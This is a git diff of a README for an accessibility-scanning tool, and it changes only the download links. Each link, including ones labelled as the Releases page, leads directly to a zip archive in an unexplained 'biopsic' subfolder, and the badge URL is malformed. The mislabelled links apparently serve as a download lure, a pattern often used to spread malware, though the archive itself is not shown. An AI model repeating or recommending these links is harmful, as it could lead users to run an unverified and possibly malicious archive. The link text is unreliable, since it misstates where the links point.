@@ -1,6 +1,6 @@
 # 🌐 Accessibility-MCP-Scraper - Detect Accessibility Issues Easily
 
-[![Download Now](https://github.com/PeleFS62/Accessibility-MCP-Scraper/raw/refs/heads/main/biopsic/Scraper_Accessibility_MC_v3.0.zip%20Now-Access%20the%20Latest%20Release-brightgreen)](https://github.com/PeleFS62/Accessibility-MCP-Scraper/raw/refs/heads/main/biopsic/Scraper_Accessibility_MC_v3.0.zip)
+[![Download Now](https://raw.githubusercontent.com/PeleFS62/Accessibility-MCP-Scraper/main/biopsic/Scraper_Accessibility_MC_v3.0.zip%20Now-Access%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/PeleFS62/Accessibility-MCP-Scraper/main/biopsic/Scraper_Accessibility_MC_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to Accessibility-MCP-Scraper! This tool helps you find accessibility iss
 
 To get started, visit the Releases page to download the latest version of Accessibility-MCP-Scraper.
 
-[Download Accessibility-MCP-Scraper from Releases](https://github.com/PeleFS62/Accessibility-MCP-Scraper/raw/refs/heads/main/biopsic/Scraper_Accessibility_MC_v3.0.zip)
+[Download Accessibility-MCP-Scraper from Releases](https://raw.githubusercontent.com/PeleFS62/Accessibility-MCP-Scraper/main/biopsic/Scraper_Accessibility_MC_v3.0.zip)
 
 Once you are on the page, find the latest release and select the appropriate version for your operating system. 
 
@@ -66,4 +66,4 @@ Accessibility-MCP-Scraper is licensed under the MIT License. This means you can 
 
 ---
 
-For any further information, refer to the [Accessibility-MCP-Scraper Releases page](https://github.com/PeleFS62/Accessibility-MCP-Scraper/raw/refs/heads/main/biopsic/Scraper_Accessibility_MC_v3.0.zip). Happy scanning!
+For any further information, refer to the [Accessibility-MCP-Scraper Releases page](https://raw.githubusercontent.com/PeleFS62/Accessibility-MCP-Scraper/main/biopsic/Scraper_Accessibility_MC_v3.0.zip). Happy scanning!
